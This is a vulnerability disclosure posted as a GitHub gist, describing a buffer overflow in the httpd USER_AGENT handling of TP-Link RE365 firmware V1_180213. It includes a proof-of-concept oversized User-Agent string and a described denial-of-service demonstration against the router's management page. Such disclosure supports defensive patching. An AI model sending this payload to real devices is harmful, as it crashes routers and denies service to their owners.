
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@XiaoCurry](https://avatars.githubusercontent.com/u/40820149?s=64&v=4)](/XiaoCurry)

# [XiaoCurry](/XiaoCurry)/**[CVE\_TP-Link\_report.md](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe)** Secret

Created
July 27, 2024 12:58

Show Gist options

* [Download ZIP](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe/archive/77a2704b653525b62e57aa31a45b483bb3fb4de2.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe.js&quot;&gt;&lt;/script&gt;
* Save XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe to your computer and use it in GitHub Desktop.

[Code](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe)
[Revisions
1](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe.js&quot;&gt;&lt;/script&gt;

Save XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe to your computer and use it in GitHub Desktop.

[Download ZIP](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe/archive/77a2704b653525b62e57aa31a45b483bb3fb4de2.zip)

CVE\_TP-Link\_report

 [Raw](/XiaoCurry/14d46e0becd79d9bb9907f2fbe147cfe/raw/77a2704b653525b62e57aa31a45b483bb3fb4de2/CVE_TP-Link_report.md)

[**CVE\_TP-Link\_report.md**](#file-cve_tp-link_report-md)

# Information

**Vendor of the products:** TP-Link

**Vendor's website:** <http://www.tp-link.com>

**Reported by:** Chen Xiao(2235254941@qq.com)

**Affected products:** TP-Link RE365 Routers

**Affected firmware version:** V1\_180213

**Firmware download address:** [TP-Link RE365](https://static.tp-link.com/2018/201806/20180605/RE365%28EU_UK_US_FR%29_V1_180213.zip)

# Overview

In the TP-Link RE365 V1\_180213 series routers, there is a **buffer overflow vulnerability** due to the lack of length verification for the `USER_AGENT` field in `/usr/bin/httpd`. Attackers who successfully exploit this vulnerability can cause the remote target device to crash or execute arbitrary commands by sending a GET request with `USER_AGENT` header filled with extremely long data.

# Vulnerability details

In the `httpRpmWmbParse` function of the `/usr/bin/httpd` binary file, the content of the `USER_AGENT` field is passed to the `PRINTF_ECHO` function.

[![1](https://private-user-images.githubusercontent.com/40820149/352721688-e22514c2-2836-40b7-8d06-1d96871f63ab.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE2ODgtZTIyNTE0YzItMjgzNi00MGI3LThkMDYtMWQ5Njg3MWY2M2FiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzNDY5MDg2ZWY1YTZkYTA1ZjJlNDdlYTkzYmM1YWU3ZWE4NDU1ZjdkOWQ1Njk0MTFjNzAwZmMyNGM3MTA5NjImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Olcfc321CyBXHN6w5fMKwBx_AH4Wx0M9pQLRpboNxqc)](https://private-user-images.githubusercontent.com/40820149/352721688-e22514c2-2836-40b7-8d06-1d96871f63ab.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE2ODgtZTIyNTE0YzItMjgzNi00MGI3LThkMDYtMWQ5Njg3MWY2M2FiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzNDY5MDg2ZWY1YTZkYTA1ZjJlNDdlYTkzYmM1YWU3ZWE4NDU1ZjdkOWQ1Njk0MTFjNzAwZmMyNGM3MTA5NjImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Olcfc321CyBXHN6w5fMKwBx_AH4Wx0M9pQLRpboNxqc)

In the `PRINTF_ECHO` function, the content of the `USER_AGENT` field is concatenated into a format string via the `vsprintf` function and stored in `v3`.

[![2](https://private-user-images.githubusercontent.com/40820149/352721697-8365d740-7ca1-4c9c-9409-04652a915f71.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE2OTctODM2NWQ3NDAtN2NhMS00YzljLTk0MDktMDQ2NTJhOTE1ZjcxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJjNGIwY2VjZjc2MDlkZTQxMWEwNmQ3NGFmN2EyZGE1ZTE0Yzk0MWE4YmQ2ZTY5NDViYTQxZmU3ODdjZmFhNTEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ahFfM6NWDS2U_zYzhe6fLy6-GTk4-Az5R5U-PPpyHK0)](https://private-user-images.githubusercontent.com/40820149/352721697-8365d740-7ca1-4c9c-9409-04652a915f71.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE2OTctODM2NWQ3NDAtN2NhMS00YzljLTk0MDktMDQ2NTJhOTE1ZjcxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJjNGIwY2VjZjc2MDlkZTQxMWEwNmQ3NGFmN2EyZGE1ZTE0Yzk0MWE4YmQ2ZTY5NDViYTQxZmU3ODdjZmFhNTEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ahFfM6NWDS2U_zYzhe6fLy6-GTk4-Az5R5U-PPpyHK0)

It is evident that there is no check on the length of the user-controllable `USER_AGENT` field, which poses a risk of **buffer overflow** vulnerability. By writing a large amount of data into the `USER_AGENT` field, it will cause a denial of service (DoS) or execute arbitrary commands.

# Poc

Send a GET request to the ip address of backend management system with a large amount of data written into the `USER_AGENT` request header.

```
Mobile;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```

# Attack Demonstration

Send a GET request using the HackBar and inject a large amount of data. The buffer overflow vulnerability will be triggered.

[![3](https://private-user-images.githubusercontent.com/40820149/352721731-93c94914-8bbc-418c-8b7f-98d2f4e5b60c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE3MzEtOTNjOTQ5MTQtOGJiYy00MThjLThiN2YtOThkMmY0ZTViNjBjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJkZjVlN2QwMjg0OWEwMGYzYjQ5OWYzMWJjNzczMjFjYmNlZjg2NzQ0MTExNTI2ZjEyNGZhYmEwNGNiMjI3MDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.5BSvB6koeWwfNLlObdkWmiq58uYdhNHUWs-GGOQ6Svc)](https://private-user-images.githubusercontent.com/40820149/352721731-93c94914-8bbc-418c-8b7f-98d2f4e5b60c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE3MzEtOTNjOTQ5MTQtOGJiYy00MThjLThiN2YtOThkMmY0ZTViNjBjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJkZjVlN2QwMjg0OWEwMGYzYjQ5OWYzMWJjNzczMjFjYmNlZjg2NzQ0MTExNTI2ZjEyNGZhYmEwNGNiMjI3MDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.5BSvB6koeWwfNLlObdkWmiq58uYdhNHUWs-GGOQ6Svc)

After the attack, a denial of service occurs, and the backend management system cannot be accessed.

[![4](https://private-user-images.githubusercontent.com/40820149/352721775-c9e01d4f-c6ac-4236-bd8f-0a267e112ed6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE3NzUtYzllMDFkNGYtYzZhYy00MjM2LWJkOGYtMGEyNjdlMTEyZWQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc1MWUxY2NiYmVhZDFmMjk5ZjU3YTA0ZGI2YzUwMDhkNTI5ZjJkOGZmNWY4ODI2NjkxMWY1ZGIxMTc1ZGQzZjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8i4-CioBxX5MP_PZl7dhaLYBOE1Akn3W_mT-cHbXHDM)](https://private-user-images.githubusercontent.com/40820149/352721775-c9e01d4f-c6ac-4236-bd8f-0a267e112ed6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjU1MjMsIm5iZiI6MTczNjUyNTIyMywicGF0aCI6Ii80MDgyMDE0OS8zNTI3MjE3NzUtYzllMDFkNGYtYzZhYy00MjM2LWJkOGYtMGEyNjdlMTEyZWQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MDcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc1MWUxY2NiYmVhZDFmMjk5ZjU3YTA0ZGI2YzUwMDhkNTI5ZjJkOGZmNWY4ODI2NjkxMWY1ZGIxMTc1ZGQzZjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8i4-CioBxX5MP_PZl7dhaLYBOE1Akn3W_mT-cHbXHDM)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FXiaoCurry%2F14d46e0becd79d9bb9907f2fbe147cfe)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

